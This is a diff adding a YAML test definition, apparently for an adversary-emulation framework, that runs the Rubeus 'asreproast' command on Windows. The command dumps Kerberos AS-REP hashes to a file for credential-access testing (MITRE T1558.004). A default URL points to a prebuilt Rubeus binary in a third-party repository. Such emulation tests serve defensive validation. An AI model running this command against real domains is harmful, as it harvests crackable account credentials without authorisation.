@@ -1,0 +1,38 @@
+api_version: "2.0"
+name: Rubeus asreproast
+description: |
+    Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
+    This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
+args:
+    - name: local_executable
+      type: string
+      default: rubeus.exe
+    - name: out_file
+      type: string
+      default: rubeus_output.txt
+    - name: rubeus_url
+      type: url
+      default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+    - name: local_folder
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads
+uuid: 615bd568-2859-41b5-9aed-61f6a88e48dd
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1558: Steal or Forge Kerberos Tickets'
+    subtechniques:
+        - 'T1558.004: AS-REP Roasting'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: rubeus-asreproast
+      inline: |
+        cmd.exe /c "{{.Args.local_folder}}\{{.Args.local_executable}}" asreproast /outfile:"{{.Args.local_folder}}\{{.Args.out_file}}"
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item "{{.Args.local_folder}}\{{.Args.out_file}}" -ErrorAction Ignore
+        executor: powershell
